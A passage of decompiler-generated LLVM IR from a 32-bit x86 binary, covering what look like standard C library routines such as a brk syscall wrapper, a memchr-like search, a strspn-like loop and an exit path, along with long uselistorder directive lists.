  uselistorder i32 %v2_80524af, { 1, 4, 2, 0, 3, 5 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 3, 0, 2, 1 }
  uselistorder i16 0, { 0, 3, 4, 5, 6, 7, 8, 9, 2, 1 }
  uselistorder i32 -255, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder i32 -48, { 1, 0 }
  uselistorder i32 10, { 3, 1, 5, 10, 11, 4, 14, 7, 12, 0, 13, 8, 9, 6, 2 }
  uselistorder i8 8, { 3, 1, 2, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_80524da, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80524d8, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_805248a, { 1, 0 }
  uselistorder label %dec_label_pc_8052466, { 1, 0 }
}

define i32 @function_80524e0(i32 %arg1) local_unnamed_addr {
dec_label_pc_80524e0:
  %v0_80524e3 = call i32 @function_804e380()
  %v0_80524e8 = load i32, i32* @edx, align 4
  %v4_80524ef = call i32 @function_804e41c(i32 %v0_80524e3, i32 %arg1, i32 %v0_80524e8, i32 %v0_80524e8)
  ret i32 %v4_80524ef
}

define i32 @function_80524f8() local_unnamed_addr {
dec_label_pc_80524f8:
  %v0_80524f8 = load i32, i32* @eax, align 4
  %v1_80524f8 = add i32 %v0_80524f8, 28
  %v2_80524f8 = inttoptr i32 %v1_80524f8 to i32*
  %v3_80524f8 = load i32, i32* %v2_80524f8, align 4
  store i32 %v3_80524f8, i32* @global_var_805bd98.102, align 8
  %v1_8052501 = add i32 %v0_80524f8, 44
  %v2_8052501 = inttoptr i32 %v1_8052501 to i32*
  %v3_8052501 = load i32, i32* %v2_8052501, align 4
  store i32 %v3_8052501, i32* @global_var_805bd9c.103, align 4
  ret i32 %v3_8052501

; uselistorder directives
  uselistorder i32 44, { 7, 0, 4, 6, 5, 1, 2, 3 }
  uselistorder i32 28, { 4, 0, 5, 1, 2, 3 }
}

define i32 @function_805250c(i32 %arg1) local_unnamed_addr {
dec_label_pc_805250c:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805250c = load i32, i32* @ebx, align 4
  store i32 %v0_805250c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_805251f = call i32 @int80_syscall(i32 45)
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 %v1_805251f, i32* @global_var_805b97c.101, align 4
  %v7_805252a = icmp ult i32 %v1_805251f, %arg1
  %v1_805252c = icmp eq i1 %v7_805252a, false
  br i1 %v1_805252c, label %dec_label_pc_805253c, label %dec_label_pc_805252e

dec_label_pc_805252e:                             ; preds = %dec_label_pc_805250c
  %v0_805252e = load i32, i32* %stack_var_-4, align 4
  %v1_805252e = call i32 @function_804e694(i32 %v0_805252e)
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_8052536 = inttoptr i32 %v1_805252e to i32*
  store i32 12, i32* %v1_8052536, align 4
  %v0_805253d.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805253c

dec_label_pc_805253c:                             ; preds = %dec_label_pc_805250c, %dec_label_pc_805252e
  %v0_805253d = phi i32 [ 0, %dec_label_pc_805250c ], [ %v0_805253d.pre, %dec_label_pc_805252e ]
  %v2_8052540 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8052540, i32* @ebx, align 4
  ret i32 %v0_805253d

; uselistorder directives
  uselistorder i32 %v1_805251f, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 12, { 37, 2, 71, 1, 4, 3, 36, 5, 6, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 0, 70, 72, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35 }
  uselistorder i32 (i32)* @function_804e694, { 25, 30, 24, 13, 12, 11, 10, 9, 42, 8, 23, 22, 7, 17, 41, 40, 39, 38, 37, 21, 20, 19, 0, 14, 36, 6, 5, 32, 31, 29, 4, 16, 1, 28, 15, 34, 27, 26, 3, 2, 35, 33, 18 }
  uselistorder i32* @global_var_805b97c.101, { 1, 0, 2 }
  uselistorder i32 45, { 1, 3, 0, 4, 2 }
  uselistorder label %dec_label_pc_805253c, { 1, 0 }
}

define i32 @function_8052720(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8052720:
  %v0_8052721 = load i32, i32* @ebx, align 4
  %v4_8052722 = urem i32 %arg2, 256
  %v4_8052726 = ptrtoint i8* %arg1 to i32
  %v2_80527313 = urem i32 %v4_8052726, 4
  %v3_80527314 = icmp eq i32 %v2_80527313, 0
  %v1_80527335 = icmp eq i1 %v3_80527314, false
  %v4_805272c = trunc i32 %arg2 to i8
  br i1 %v1_80527335, label %dec_label_pc_805272c, label %dec_label_pc_8052735

dec_label_pc_805272c:                             ; preds = %dec_label_pc_8052720, %dec_label_pc_8052730
  %v0_8052730 = phi i32 [ %v1_8052730, %dec_label_pc_8052730 ], [ %v4_8052726, %dec_label_pc_8052720 ]
  %v1_805272c = inttoptr i32 %v0_8052730 to i8*
  %v2_805272c = load i8, i8* %v1_805272c, align 1
  %v15_805272c = icmp eq i8 %v2_805272c, %v4_805272c
  br i1 %v15_805272c, label %dec_label_pc_8052780, label %dec_label_pc_8052730

dec_label_pc_8052730:                             ; preds = %dec_label_pc_805272c
  %v1_8052730 = add i32 %v0_8052730, 1
  %v2_8052731 = urem i32 %v1_8052730, 4
  %v3_8052731 = icmp eq i32 %v2_8052731, 0
  %v1_8052733 = icmp eq i1 %v3_8052731, false
  br i1 %v1_8052733, label %dec_label_pc_805272c, label %dec_label_pc_8052735

dec_label_pc_8052735:                             ; preds = %dec_label_pc_8052720, %dec_label_pc_8052730
  %v0_8052738 = phi i32 [ %v1_8052730, %dec_label_pc_8052730 ], [ %v4_8052726, %dec_label_pc_8052720 ]
  %v2_805273c = mul nuw nsw i32 %v4_8052722, 256
  %v2_805273f = or i32 %v2_805273c, %v4_8052722
  %v2_8052743 = mul i32 %v2_805273f, 65536
  %v2_8052746 = or i32 %v2_8052743, %v2_805273f
  br label %dec_label_pc_8052748

dec_label_pc_8052748:                             ; preds = %dec_label_pc_8052778, %dec_label_pc_8052748, %dec_label_pc_8052735
  %v0_805274c = phi i32 [ %v0_8052738, %dec_label_pc_8052735 ], [ %v1_805274c, %dec_label_pc_8052748 ], [ %v1_805274c, %dec_label_pc_8052778 ]
  %v2_805274a = inttoptr i32 %v0_805274c to i32*
  %v3_805274a = load i32, i32* %v2_805274a, align 4
  %v4_805274a = xor i32 %v3_805274a, %v2_8052746
  %v1_805274c = add i32 %v0_805274c, 4
  %v1_805274f = add i32 %v4_805274a, 2130640639
  %v1_8052755 = sub i32 -1, %v4_805274a
  %v2_8052757 = xor i32 %v1_805274f, %v1_8052755
  %v1_8052759 = and i32 %v2_8052757, -2130640640
  %v2_8052759 = icmp eq i32 %v1_8052759, 0
  br i1 %v2_8052759, label %dec_label_pc_8052748, label %dec_label_pc_8052760

dec_label_pc_8052760:                             ; preds = %dec_label_pc_8052748
  %v2_8052760 = inttoptr i32 %v0_805274c to i8*
  %v3_8052760 = load i8, i8* %v2_8052760, align 1
  %v16_8052760 = icmp eq i8 %v3_8052760, %v4_805272c
  br i1 %v16_8052760, label %dec_label_pc_8052780, label %dec_label_pc_8052768

dec_label_pc_8052768:                             ; preds = %dec_label_pc_8052760
  %v1_8052768 = add i32 %v0_805274c, 1
  %v2_8052768 = inttoptr i32 %v1_8052768 to i8*
  %v3_8052768 = load i8, i8* %v2_8052768, align 1
  %v16_8052768 = icmp eq i8 %v3_8052768, %v4_805272c
  br i1 %v16_8052768, label %dec_label_pc_8052780, label %dec_label_pc_8052770

dec_label_pc_8052770:                             ; preds = %dec_label_pc_8052768
  %v1_8052770 = add i32 %v0_805274c, 2
  %v2_8052770 = inttoptr i32 %v1_8052770 to i8*
  %v3_8052770 = load i8, i8* %v2_8052770, align 1
  %v16_8052770 = icmp eq i8 %v3_8052770, %v4_805272c
  br i1 %v16_8052770, label %dec_label_pc_8052780, label %dec_label_pc_8052778

dec_label_pc_8052778:                             ; preds = %dec_label_pc_8052770
  %v1_8052778 = add i32 %v0_805274c, 3
  %v2_8052778 = inttoptr i32 %v1_8052778 to i8*
  %v3_8052778 = load i8, i8* %v2_8052778, align 1
  %v16_8052778 = icmp eq i8 %v3_8052778, %v4_805272c
  %v1_805277e = icmp eq i1 %v16_8052778, false
  br i1 %v1_805277e, label %dec_label_pc_8052748, label %dec_label_pc_8052780

dec_label_pc_8052780:                             ; preds = %dec_label_pc_805272c, %dec_label_pc_8052778, %dec_label_pc_8052770, %dec_label_pc_8052768, %dec_label_pc_8052760
  %v0_8052782 = phi i32 [ %v1_8052778, %dec_label_pc_8052778 ], [ %v1_8052770, %dec_label_pc_8052770 ], [ %v1_8052768, %dec_label_pc_8052768 ], [ %v0_805274c, %dec_label_pc_8052760 ], [ %v0_8052730, %dec_label_pc_805272c ]
  store i32 %v0_8052721, i32* @ebx, align 4
  ret i32 %v0_8052782

; uselistorder directives
  uselistorder i32 %v1_805274c, { 1, 0 }
  uselistorder i32 %v2_805273f, { 1, 0 }
  uselistorder i32 %v1_8052730, { 1, 0, 2 }
  uselistorder i8 %v4_805272c, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v4_8052726, { 2, 1, 0 }
  uselistorder i32 %v4_8052722, { 1, 0 }
  uselistorder i32 3, { 5, 2, 3, 1, 11, 9, 19, 14, 22, 7, 8, 15, 12, 4, 20, 21, 0, 6, 13, 16, 17, 18, 10 }
  uselistorder i32 2, { 11, 34, 45, 46, 53, 18, 33, 12, 0, 35, 17, 26, 1, 2, 19, 3, 4, 48, 5, 6, 24, 7, 43, 44, 13, 14, 15, 8, 20, 21, 22, 47, 52, 25, 36, 37, 38, 27, 28, 39, 16, 40, 41, 29, 10, 42, 30, 31, 32, 49, 23, 50, 9, 51 }
  uselistorder i32 65536, { 0, 1, 19, 20, 3, 2, 4, 5, 8, 9, 10, 6, 11, 7, 13, 12, 14, 17, 15, 18, 16 }
  uselistorder i32 4, { 34, 1, 2, 3, 35, 159, 160, 161, 167, 168, 173, 174, 175, 162, 21, 32, 163, 164, 165, 166, 4, 36, 40, 41, 42, 26, 37, 38, 39, 24, 100, 101, 102, 103, 43, 44, 45, 46, 47, 25, 5, 48, 49, 169, 171, 112, 113, 114, 115, 116, 117, 6, 118, 119, 120, 121, 122, 0, 123, 110, 111, 124, 22, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 17, 145, 146, 23, 147, 7, 50, 170, 172, 8, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 30, 81, 82, 83, 84, 85, 86, 87, 19, 20, 88, 89, 90, 91, 92, 93, 94, 95, 9, 96, 97, 98, 99, 104, 10, 11, 105, 12, 27, 28, 31, 106, 29, 107, 108, 13, 18, 14, 15, 109, 16, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 33 }
  uselistorder i32 256, { 1, 2, 3, 4, 5, 30, 6, 7, 32, 8, 9, 0, 10, 11, 12, 13, 14, 15, 31, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8052780, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_8052735, { 1, 0 }
  uselistorder label %dec_label_pc_805272c, { 1, 0 }
}

define i32 @function_8052784(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8052784:
  %v2_80527a615 = load i8, i8* %arg1, align 1
  %v4_80527a820 = icmp eq i8 %v2_80527a615, 0
  br i1 %v4_80527a820, label %dec_label_pc_80527b0, label %dec_label_pc_80527ac.lr.ph

dec_label_pc_80527ac.lr.ph:                       ; preds = %dec_label_pc_8052784
  %v4_80527a617 = load i32, i32* @eax, align 4
  %v5_80527a618 = and i32 %v4_80527a617, -256
  %v3_80527a616 = zext i8 %v2_80527a615 to i32
  %v6_80527a619 = or i32 %v5_80527a618, %v3_80527a616
  %v4_805278d = ptrtoint i8* %arg1 to i32
  %v4_80527988.pre = load i32, i32* @ecx, align 4
  %v1_80527985 = inttoptr i32 %arg2 to i8*
  br label %dec_label_pc_80527ac

dec_label_pc_8052793:                             ; preds = %dec_label_pc_8052793.preheader, %dec_label_pc_8052797
  %v0_8052797 = phi i32 [ %v1_8052797, %dec_label_pc_8052797 ], [ %arg2, %dec_label_pc_8052793.preheader ]
  %v4_8052798 = phi i32 [ %v6_8052798, %dec_label_pc_8052797 ], [ %v6_805279810, %dec_label_pc_8052793.preheader ]
  %v3_8052793 = trunc i32 %v4_8052798 to i8
  %v15_8052793 = icmp eq i8 %v1_8052793, %v3_8052793
  br i1 %v15_8052793, label %dec_label_pc_80527a0, label %dec_label_pc_8052797

dec_label_pc_8052797:                             ; preds = %dec_label_pc_8052793
  %v1_8052797 = add i32 %v0_8052797, 1
  store i32 %v1_8052797, i32* @edx, align 4
  %v1_8052798 = inttoptr i32 %v1_8052797 to i8*
  %v2_8052798 = load i8, i8* %v1_8052798, align 1
  %v3_8052798 = zext i8 %v2_8052798 to i32
  %v5_8052798 = and i32 %v4_8052798, -256
  %v6_8052798 = or i32 %v3_8052798, %v5_8052798
  store i32 %v6_8052798, i32* @ecx, align 4
  %v4_805279a = icmp eq i8 %v2_8052798, 0
  %v1_805279c = icmp eq i1 %v4_805279a, false
  br i1 %v1_805279c, label %dec_label_pc_8052793, label %dec_label_pc_80527b0

dec_label_pc_80527a0:                             ; preds = %dec_label_pc_8052793
  %v4_80527a0 = icmp eq i8 %v1_8052793, 0
  br i1 %v4_80527a0, label %dec_label_pc_80527b0, label %dec_label_pc_80527a4

dec_label_pc_80527a4:                             ; preds = %dec_label_pc_80527a0
  %v1_80527a4 = add i32 %v0_80527a4, 1
  %v1_80527a5 = add i32 %v0_80527a5, 1
  %v1_80527a6 = inttoptr i32 %v1_80527a5 to i8*
  %v2_80527a6 = load i8, i8* %v1_80527a6, align 1
  %v3_80527a6 = zext i8 %v2_80527a6 to i32
  %v5_80527a6 = and i32 %v4_80527a6, -256
  %v6_80527a6 = or i32 %v3_80527a6, %v5_80527a6
  %v4_80527a8 = icmp eq i8 %v2_80527a6, 0
  br i1 %v4_80527a8, label %dec_label_pc_80527b0, label %dec_label_pc_80527ac

dec_label_pc_80527ac:                             ; preds = %dec_label_pc_80527ac.lr.ph, %dec_label_pc_80527a4
  %v0_80527a5 = phi i32 [ %v4_805278d, %dec_label_pc_80527ac.lr.ph ], [ %v1_80527a5, %dec_label_pc_80527a4 ]
  %v0_80527a4 = phi i32 [ 0, %dec_label_pc_80527ac.lr.ph ], [ %v1_80527a4, %dec_label_pc_80527a4 ]
  %v4_80527a6 = phi i32 [ %v6_80527a619, %dec_label_pc_80527ac.lr.ph ], [ %v6_80527a6, %dec_label_pc_80527a4 ]
  %v4_80527988 = phi i32 [ %v4_80527988.pre, %dec_label_pc_80527ac.lr.ph ], [ %v4_8052798, %dec_label_pc_80527a4 ]
  store i32 %arg2, i32* @edx, align 4
  %v2_80527986 = load i8, i8* %v1_80527985, align 1
  %v3_80527987 = zext i8 %v2_80527986 to i32
  %v5_80527989 = and i32 %v4_80527988, -256
  %v6_805279810 = or i32 %v3_80527987, %v5_80527989
  store i32 %v6_805279810, i32* @ecx, align 4
  %v4_805279a11 = icmp eq i8 %v2_80527986, 0
  %v1_805279c13 = icmp eq i1 %v4_805279a11, false
  br i1 %v1_805279c13, label %dec_label_pc_8052793.preheader, label %dec_label_pc_80527b0

dec_label_pc_8052793.preheader:                   ; preds = %dec_label_pc_80527ac
  %v1_8052793 = trunc i32 %v4_80527a6 to i8
  br label %dec_label_pc_8052793

dec_label_pc_80527b0:                             ; preds = %dec_label_pc_80527a4, %dec_label_pc_80527a0, %dec_label_pc_80527ac, %dec_label_pc_8052797, %dec_label_pc_8052784
  %v0_80527b1 = phi i32 [ 0, %dec_label_pc_8052784 ], [ %v0_80527a4, %dec_label_pc_8052797 ], [ %v0_80527a4, %dec_label_pc_80527a0 ], [ %v1_80527a4, %dec_label_pc_80527a4 ], [ %v0_80527a4, %dec_label_pc_80527ac ]
  ret i32 %v0_80527b1

; uselistorder directives
  uselistorder i32 %v6_805279810, { 1, 0 }
  uselistorder i32 %v6_8052798, { 1, 0 }
  uselistorder i32 %v1_8052797, { 2, 1, 0 }
  uselistorder i8 %v2_80527a615, { 1, 0 }
  uselistorder i32* @edx, { 4, 6, 37, 15, 0, 7, 8, 9, 10, 11, 40, 41, 45, 44, 12, 19, 20, 1, 21, 22, 2, 23, 18, 24, 3, 25, 43, 16, 17, 39, 42, 36, 38, 13, 14, 26, 27, 28, 29, 30, 31, 32, 33, 34, 5, 35, 46 }
  uselistorder i32* @ecx, { 4, 7, 0, 1, 8, 9, 10, 11, 5, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 2, 32, 33, 34, 3, 35, 38, 6, 36, 37 }
  uselistorder i32 -256, { 6, 10, 9, 5, 30, 8, 12, 11, 7, 13, 14, 16, 17, 32, 1, 15, 2, 33, 34, 28, 29, 18, 19, 20, 21, 22, 23, 24, 25, 26, 3, 4, 0, 27, 31 }
  uselistorder i8 0, { 4, 31, 29, 30, 3, 75, 76, 6, 33, 32, 5, 34, 35, 39, 36, 37, 97, 100, 17, 27, 15, 16, 38, 7, 99, 81, 82, 83, 84, 85, 86, 87, 88, 18, 89, 2, 1, 0, 19, 20, 21, 70, 71, 98, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 13, 62, 63, 64, 65, 66, 67, 68, 69, 72, 73, 74, 8, 77, 78, 14, 79, 9, 80, 90, 92, 91, 10, 93, 94, 12, 95, 11, 96, 28, 22, 23, 24, 25, 26 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80527b0, { 2, 0, 1, 3, 4 }
  uselistorder label %dec_label_pc_80527ac, { 1, 0 }
}

define i32 @function_8052810() local_unnamed_addr {
dec_label_pc_8052810:
  %stack_var_-16 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp6, i32* %stack_var_-16, align 4
  %v0_805281c = load i32, i32* @global_var_80555e0.89, align 32
  %v10_8052821 = icmp eq i32 %v0_805281c, -1
  br i1 %v10_8052821, label %dec_label_pc_805283c, label %dec_label_pc_8052830.preheader

dec_label_pc_8052830.preheader:                   ; preds = %dec_label_pc_8052810
  br label %dec_label_pc_8052830

dec_label_pc_8052830:                             ; preds = %dec_label_pc_8052830.preheader, %dec_label_pc_8052830
  %v4_8052833 = phi i32 [ %v0_805281c, %dec_label_pc_8052830.preheader ], [ %v2_8052835, %dec_label_pc_8052830 ]
  %v0_8052830 = phi i32 [ ptrtoint (i32* @global_var_80555e0.89 to i32), %dec_label_pc_8052830.preheader ], [ %v1_8052830, %dec_label_pc_8052830 ]
  %v1_8052830 = add i32 %v0_8052830, -4
  call void @__pseudo_call(i32 %v4_8052833)
  %v1_8052835 = inttoptr i32 %v1_8052830 to i32*
  %v2_8052835 = load i32, i32* %v1_8052835, align 4
  %v10_8052837 = icmp eq i32 %v2_8052835, -1
  %v1_805283a = icmp eq i1 %v10_8052837, false
  br i1 %v1_805283a, label %dec_label_pc_8052830, label %dec_label_pc_805283c.loopexit

dec_label_pc_805283c.loopexit:                    ; preds = %dec_label_pc_8052830
  %v2_805283c.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_805283c

dec_label_pc_805283c:                             ; preds = %dec_label_pc_805283c.loopexit, %dec_label_pc_8052810
  %v2_805283c = phi i32 [ %v2_805283c.pre, %dec_label_pc_805283c.loopexit ], [ %tmp6, %dec_label_pc_8052810 ]
  ret i32 %v2_805283c

; uselistorder directives
  uselistorder i32 %v0_805281c, { 1, 0 }
  uselistorder i1 false, { 201, 7, 38, 39, 40, 8, 149, 132, 133, 135, 134, 9, 41, 42, 43, 44, 45, 46, 47, 60, 61, 62, 63, 48, 49, 202, 203, 5, 150, 151, 152, 51, 219, 220, 221, 222, 225, 10, 226, 227, 224, 218, 204, 50, 205, 206, 36, 52, 53, 54, 55, 56, 57, 11, 58, 12, 91, 92, 59, 209, 210, 211, 1, 212, 213, 216, 217, 0, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 153, 166, 167, 168, 169, 170, 171, 172, 173, 174, 4, 176, 175, 180, 177, 178, 179, 13, 181, 182, 140, 223, 121, 122, 123, 125, 124, 14, 126, 127, 128, 207, 15, 208, 2, 214, 215, 143, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 3, 90, 16, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 30, 104, 105, 106, 107, 108, 29, 109, 110, 111, 112, 113, 114, 115, 116, 117, 28, 118, 31, 32, 120, 119, 17, 130, 129, 18, 131, 19, 136, 137, 138, 20, 139, 6, 141, 142, 144, 145, 33, 146, 147, 148, 191, 183, 184, 185, 186, 187, 188, 189, 190, 21, 192, 22, 193, 194, 195, 34, 26, 196, 25, 35, 24, 197, 198, 23, 199, 200, 37, 27, 228 }
  uselistorder void (i32)* @__pseudo_call, { 2, 4, 0, 5, 6, 7, 3, 1 }
  uselistorder i32 -4, { 3, 4, 5, 6, 7, 8, 9, 10, 13, 14, 15, 16, 1, 17, 0, 12, 18, 19, 20, 21, 22, 23, 2, 11 }
  uselistorder i32 ptrtoint (i32* @global_var_80555e0.89 to i32), { 0, 2, 3, 4, 1 }
  uselistorder i32 -1, { 0, 1, 25, 88, 90, 89, 34, 26, 91, 92, 2, 93, 94, 37, 36, 95, 38, 96, 39, 40, 97, 41, 98, 42, 99, 43, 100, 44, 101, 45, 102, 46, 103, 47, 104, 48, 105, 3, 4, 5, 106, 35, 49, 107, 108, 51, 50, 52, 109, 53, 110, 73, 111, 54, 112, 113, 156, 30, 31, 114, 29, 115, 6, 153, 154, 9, 8, 10, 11, 12, 55, 13, 56, 14, 116, 7, 155, 27, 117, 118, 15, 57, 149, 152, 119, 120, 58, 121, 59, 122, 32, 33, 123, 60, 124, 61, 125, 62, 126, 63, 127, 64, 128, 65, 129, 66, 130, 67, 131, 68, 132, 69, 133, 70, 134, 71, 135, 72, 136, 18, 16, 17, 74, 28, 19, 20, 84, 151, 150, 137, 85, 138, 139, 140, 141, 21, 142, 82, 83, 81, 22, 75, 76, 77, 78, 79, 80, 23, 143, 144, 145, 146, 147, 148, 24, 86, 87 }
  uselistorder i32 1, { 196, 326, 327, 328, 121, 329, 197, 42, 123, 124, 382, 383, 384, 385, 125, 330, 331, 332, 63, 333, 198, 53, 54, 343, 344, 0, 86, 85, 84, 83, 82, 334, 335, 199, 60, 59, 61, 443, 444, 445, 200, 67, 66, 64, 68, 65, 201, 78, 202, 79, 203, 107, 204, 102, 205, 101, 206, 108, 207, 72, 208, 19, 209, 81, 210, 74, 211, 215, 214, 213, 212, 52, 448, 449, 450, 218, 217, 216, 16, 18, 17, 126, 220, 219, 222, 221, 106, 127, 176, 323, 446, 225, 224, 223, 93, 91, 92, 141, 226, 336, 337, 338, 339, 227, 45, 44, 46, 47, 43, 48, 128, 228, 5, 6, 340, 325, 137, 341, 177, 342, 192, 229, 89, 88, 87, 90, 230, 33, 31, 29, 30, 35, 34, 32, 40, 37, 39, 41, 36, 38, 142, 231, 143, 232, 144, 233, 145, 235, 234, 178, 238, 237, 236, 105, 146, 396, 397, 398, 239, 25, 26, 399, 400, 129, 401, 402, 403, 15, 13, 14, 179, 395, 147, 111, 112, 113, 114, 148, 404, 405, 406, 407, 408, 409, 410, 411, 412, 122, 413, 414, 415, 416, 417, 130, 418, 419, 115, 131, 420, 421, 422, 423, 132, 133, 424, 425, 426, 242, 241, 240, 94, 96, 97, 95, 98, 134, 135, 243, 149, 180, 244, 245, 246, 247, 248, 249, 345, 346, 62, 252, 251, 250, 12, 253, 373, 374, 375, 376, 377, 378, 379, 150, 151, 254, 9, 8, 7, 120, 152, 153, 154, 255, 70, 69, 71, 256, 56, 55, 447, 258, 257, 109, 110, 136, 451, 259, 104, 261, 260, 11, 262, 10, 263, 22, 264, 51, 265, 80, 266, 100, 73, 268, 267, 99, 269, 23, 270, 24, 272, 271, 103, 273, 274, 28, 275, 57, 276, 50, 277, 27, 49, 353, 347, 348, 349, 116, 350, 351, 352, 354, 282, 281, 280, 279, 278, 76, 75, 77, 170, 324, 283, 355, 284, 20, 21, 155, 286, 285, 1, 2, 158, 356, 181, 156, 157, 357, 358, 289, 288, 287, 171, 359, 360, 290, 182, 167, 168, 361, 291, 193, 362, 363, 169, 183, 159, 364, 365, 297, 296, 295, 294, 293, 292, 366, 367, 117, 184, 368, 160, 161, 369, 370, 299, 298, 194, 371, 372, 301, 300, 185, 380, 303, 302, 381, 304, 172, 386, 387, 173, 388, 389, 174, 175, 390, 391, 305, 392, 118, 393, 186, 187, 308, 307, 306, 188, 119, 162, 394, 309, 310, 3, 313, 312, 311, 315, 314, 427, 428, 189, 429, 430, 140, 431, 317, 316, 163, 4, 319, 318, 164, 432, 139, 433, 434, 165, 435, 138, 436, 437, 166, 190, 191, 438, 195, 439, 440, 441, 442, 58, 321, 320, 322 }
  uselistorder label %dec_label_pc_8052830, { 1, 0 }
}

define i32 @function_8052844() local_unnamed_addr {
entry:
  %v0_8052847 = load i32, i32* @ebx, align 4
  %v1_8052848 = call i32 @function_80480b0(i32 %v0_8052847)
  store i32 %v1_8052848, i32* @eax, align 4
  %v0_8052853 = call i32 @function_80480c0()
  ret i32 %v0_8052853

; uselistorder directives
  uselistorder i32* @eax, { 7, 3, 49, 37, 51, 52, 53, 54, 56, 9, 57, 0, 55, 4, 6, 50, 10, 8, 11, 12, 15, 13, 38, 40, 41, 39, 42, 43, 45, 46, 44, 1, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 32, 29, 30, 31, 33, 34, 35, 36, 58, 47, 48, 2, 5 }
  uselistorder i32 (i32)* @function_80480b0, { 1, 0 }
  uselistorder i32 0, { 35, 61, 296, 114, 88, 62, 272, 63, 423, 424, 64, 425, 426, 427, 65, 46, 115, 56, 273, 47, 297, 66, 298, 12, 48, 116, 299, 89, 67, 300, 0, 301, 329, 330, 331, 117, 150, 151, 332, 333, 334, 335, 336, 337, 274, 302, 303, 304, 305, 36, 498, 499, 500, 501, 502, 503, 504, 505, 40, 90, 435, 450, 451, 452, 156, 453, 454, 507, 308, 508, 509, 510, 511, 306, 512, 455, 456, 513, 68, 514, 118, 525, 526, 39, 13, 275, 14, 69, 276, 277, 538, 542, 91, 543, 70, 259, 157, 158, 1, 515, 516, 517, 71, 307, 268, 518, 519, 72, 278, 524, 309, 310, 311, 312, 279, 280, 313, 314, 315, 119, 73, 74, 281, 316, 282, 317, 75, 283, 76, 284, 318, 92, 319, 320, 321, 322, 323, 2, 285, 404, 286, 324, 325, 326, 327, 287, 77, 527, 32, 260, 78, 120, 531, 534, 533, 30, 31, 459, 121, 460, 461, 462, 463, 122, 464, 465, 466, 159, 457, 160, 458, 161, 288, 289, 162, 261, 290, 163, 262, 79, 291, 467, 468, 80, 81, 164, 263, 58, 27, 28, 469, 470, 471, 472, 473, 474, 82, 83, 165, 264, 57, 475, 93, 476, 45, 477, 478, 480, 292, 479, 3, 328, 4, 532, 5, 123, 436, 437, 438, 428, 338, 84, 85, 293, 294, 124, 539, 541, 49, 419, 420, 125, 126, 520, 521, 94, 523, 522, 33, 166, 506, 380, 528, 529, 530, 414, 434, 441, 535, 127, 496, 540, 442, 497, 443, 409, 444, 445, 536, 537, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 381, 382, 383, 384, 385, 265, 386, 387, 266, 136, 388, 389, 390, 391, 132, 41, 133, 42, 134, 43, 392, 135, 44, 393, 167, 394, 395, 38, 29, 396, 37, 95, 168, 397, 398, 399, 128, 400, 34, 401, 402, 403, 15, 16, 96, 97, 98, 99, 267, 169, 17, 18, 19, 20, 21, 6, 7, 8, 9, 405, 407, 408, 59, 170, 60, 171, 137, 172, 138, 406, 152, 173, 174, 129, 139, 130, 10, 131, 270, 175, 410, 110, 111, 112, 113, 177, 411, 176, 178, 140, 412, 413, 179, 415, 416, 417, 269, 141, 180, 182, 143, 181, 142, 101, 100, 87, 50, 418, 183, 22, 102, 184, 185, 422, 186, 421, 188, 189, 103, 187, 190, 191, 429, 430, 153, 431, 432, 51, 433, 23, 154, 104, 271, 439, 192, 193, 194, 440, 196, 195, 446, 447, 448, 449, 197, 52, 198, 199, 200, 201, 202, 481, 24, 25, 109, 105, 146, 147, 482, 483, 484, 485, 106, 144, 145, 148, 486, 487, 488, 489, 53, 54, 107, 490, 155, 55, 26, 491, 492, 149, 11, 493, 494, 495, 86, 295, 108, 203, 204, 205, 206, 207, 208, 209, 